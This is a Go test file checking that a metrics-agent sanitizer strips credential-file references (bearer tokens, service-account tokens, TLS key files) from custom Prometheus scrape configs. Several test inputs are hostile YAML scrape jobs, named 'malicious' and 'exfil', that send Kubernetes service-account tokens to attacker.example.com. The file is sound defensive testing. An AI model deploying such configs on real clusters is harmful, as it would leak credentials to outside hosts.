package configmapsettings

import (
	"testing"

	"gopkg.in/yaml.v2"
)

// TestSanitizeStripsCredentialsFile verifies that authorization.credentials_file
// is removed from custom scrape configs.
func TestSanitizeStripsCredentialsFile(t *testing.T) {
	input := `scrape_configs:
- job_name: malicious
  authorization:
    type: Bearer
    credentials_file: /var/run/secrets/kubernetes.io/serviceaccount/token
  static_configs:
  - targets:
    - attacker.example.com:8080
`
	result := sanitizeCustomScrapeConfigs(input)

	var config map[interface{}]interface{}
	if err := yaml.Unmarshal([]byte(result), &config); err != nil {
		t.Fatalf("Failed to unmarshal result: %v", err)
	}

	scrapeConfigs := config["scrape_configs"].([]interface{})
	sc := scrapeConfigs[0].(map[interface{}]interface{})

	// authorization block should be removed entirely since credentials_file was the only field besides type
	if auth, ok := sc["authorization"].(map[interface{}]interface{}); ok {
		if _, exists := auth["credentials_file"]; exists {
			t.Error("Expected authorization.credentials_file to be stripped")
		}
	}
}

// TestSanitizeStripsBearerTokenFile verifies that bearer_token_file
// is removed from custom scrape configs.
func TestSanitizeStripsBearerTokenFile(t *testing.T) {
	input := `scrape_configs:
- job_name: exfil
  bearer_token_file: /var/run/secrets/ama-metrics/token
  static_configs:
  - targets:
    - attacker.example.com:9090
`
	result := sanitizeCustomScrapeConfigs(input)

	var config map[interface{}]interface{}
	if err := yaml.Unmarshal([]byte(result), &config); err != nil {
		t.Fatalf("Failed to unmarshal result: %v", err)
	}

	scrapeConfigs := config["scrape_configs"].([]interface{})
	sc := scrapeConfigs[0].(map[interface{}]interface{})

	if _, exists := sc["bearer_token_file"]; exists {
		t.Error("Expected bearer_token_file to be stripped")
	}
}

// TestSanitizeStripsTLSFiles verifies that tls_config file references
// (ca_file, cert_file, key_file) are removed from custom scrape configs.
func TestSanitizeStripsTLSFiles(t *testing.T) {
	for _, tc := range []struct {
		name  string
		field string
	}{
		{"ca_file", "ca_file"},
		{"cert_file", "cert_file"},
		{"key_file", "key_file"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			input := "scrape_configs:\n- job_name: tls-exfil\n  tls_config:\n    " + tc.field + ": /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\n"
			result := sanitizeCustomScrapeConfigs(input)

			var config map[interface{}]interface{}
			if err := yaml.Unmarshal([]byte(result), &config); err != nil {
				t.Fatalf("Failed to unmarshal result: %v", err)
			}

			scrapeConfigs := config["scrape_configs"].([]interface{})
			sc := scrapeConfigs[0].(map[interface{}]interface{})

			// tls_config should be removed entirely since the file field was the only content
			if tlsCfg, ok := sc["tls_config"].(map[interface{}]interface{}); ok {
				if _, exists := tlsCfg[tc.field]; exists {
					t.Errorf("Expected tls_config.%s to be stripped", tc.field)
				}
			}
		})
	}
}

// TestSanitizeKeepsSafeConfigs verifies that scrape configs without
// file-based credential references are passed through unchanged.
func TestSanitizeKeepsSafeConfigs(t *testing.T) {
	input := `scrape_configs:
- job_name: safe-job
  scrape_interval: 30s
  static_configs:
  - targets:
    - localhost:9090
  tls_config:
    insecure_skip_verify: true
`
	result := sanitizeCustomScrapeConfigs(input)

	var config map[interface{}]interface{}
	if err := yaml.Unmarshal([]byte(result), &config); err != nil {
		t.Fatalf("Failed to unmarshal result: %v", err)
	}

	scrapeConfigs := config["scrape_configs"].([]interface{})
	sc := scrapeConfigs[0].(map[interface{}]interface{})

	if sc["job_name"] != "safe-job" {
		t.Errorf("Expected job_name 'safe-job', got %v", sc["job_name"])
	}
	if sc["scrape_interval"] != "30s" {
		t.Errorf("Expected scrape_interval '30s', got %v", sc["scrape_interval"])
	}

	// tls_config should be preserved since it only has insecure_skip_verify
	tlsCfg, ok := sc["tls_config"].(map[interface{}]interface{})
	if !ok {
		t.Error("Expected tls_config to be preserved")
	} else if tlsCfg["insecure_skip_verify"] != true {
		t.Error("Expected insecure_skip_verify to remain true")
	}
}

// TestSanitizeMixedConfigs verifies that in a mixed list, only the
// unsafe fields are stripped while safe scrape configs remain intact.
func TestSanitizeMixedConfigs(t *testing.T) {
	input := `scrape_configs:
- job_name: safe-job
  static_configs:
  - targets:
    - localhost:9090
- job_name: unsafe-job
  bearer_token_file: /var/run/secrets/ama-metrics/token
  authorization:
    type: Bearer
    credentials_file: /var/run/secrets/kubernetes.io/serviceaccount/token
  tls_config:
    ca_file: /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
    insecure_skip_verify: true
  static_configs:
  - targets:
    - attacker.example.com:8080
`
	result := sanitizeCustomScrapeConfigs(input)

	var config map[interface{}]interface{}
	if err := yaml.Unmarshal([]byte(result), &config); err != nil {
		t.Fatalf("Failed to unmarshal result: %v", err)
	}

	scrapeConfigs := config["scrape_configs"].([]interface{})
	if len(scrapeConfigs) != 2 {
		t.Fatalf("Expected 2 scrape configs, got %d", len(scrapeConfigs))
	}

	// First job should be completely unchanged
	safe := scrapeConfigs[0].(map[interface{}]interface{})
	if safe["job_name"] != "safe-job" {
		t.Error("Expected first job to be 'safe-job'")
	}

	// Second job should have dangerous fields stripped but remain present
	unsafe := scrapeConfigs[1].(map[interface{}]interface{})
	if unsafe["job_name"] != "unsafe-job" {
		t.Error("Expected second job to be 'unsafe-job'")
	}
	if _, exists := unsafe["bearer_token_file"]; exists {
		t.Error("Expected bearer_token_file to be stripped from unsafe job")
	}
	if auth, ok := unsafe["authorization"].(map[interface{}]interface{}); ok {
		if _, exists := auth["credentials_file"]; exists {
			t.Error("Expected authorization.credentials_file to be stripped from unsafe job")
		}
	}
	// tls_config should remain but without ca_file
	if tlsCfg, ok := unsafe["tls_config"].(map[interface{}]interface{}); ok {
		if _, exists := tlsCfg["ca_file"]; exists {
			t.Error("Expected tls_config.ca_file to be stripped from unsafe job")
		}
		if tlsCfg["insecure_skip_verify"] != true {
			t.Error("Expected insecure_skip_verify to remain in tls_config")
		}
	} else {
		t.Error("Expected tls_config to remain (with insecure_skip_verify)")
	}
}

// TestSanitizeEmptyConfig verifies that an empty config is a no-op.
func TestSanitizeEmptyConfig(t *testing.T) {
	input := `scrape_configs: []
`
	result := sanitizeCustomScrapeConfigs(input)

	var config map[interface{}]interface{}
	if err := yaml.Unmarshal([]byte(result), &config); err != nil {
		t.Fatalf("Failed to unmarshal result: %v", err)
	}

	scrapeConfigs := config["scrape_configs"].([]interface{})
	if len(scrapeConfigs) != 0 {
		t.Errorf("Expected 0 scrape configs, got %d", len(scrapeConfigs))
	}
}

// TestSanitizeNoScrapeConfigs verifies that a config with no
// scrape_configs key is passed through unchanged.
func TestSanitizeNoScrapeConfigs(t *testing.T) {
	input := `global:
  scrape_interval: 15s
`
	result := sanitizeCustomScrapeConfigs(input)
	if result != input {
		t.Error("Expected config without scrape_configs to be returned unchanged")
	}
}

// TestSanitizePreservesAuthorizationType verifies that when
// credentials_file is stripped but authorization.type remains,
// the authorization block is preserved with the type field.
func TestSanitizePreservesAuthorizationType(t *testing.T) {
	input := `scrape_configs:
- job_name: partial-auth
  authorization:
    type: Bearer
    credentials_file: /var/run/secrets/ama-metrics/token
    credentials: some-inline-token
`
	result := sanitizeCustomScrapeConfigs(input)

	var config map[interface{}]interface{}
	if err := yaml.Unmarshal([]byte(result), &config); err != nil {
		t.Fatalf("Failed to unmarshal result: %v", err)
	}

	scrapeConfigs := config["scrape_configs"].([]interface{})
	sc := scrapeConfigs[0].(map[interface{}]interface{})

	auth, ok := sc["authorization"].(map[interface{}]interface{})
	if !ok {
		t.Fatal("Expected authorization block to remain (has type and credentials)")
	}
	if _, exists := auth["credentials_file"]; exists {
		t.Error("Expected credentials_file to be stripped")
	}
	if auth["type"] != "Bearer" {
		t.Error("Expected authorization.type to be preserved")
	}
	if auth["credentials"] != "some-inline-token" {
		t.Error("Expected authorization.credentials to be preserved")
	}
}
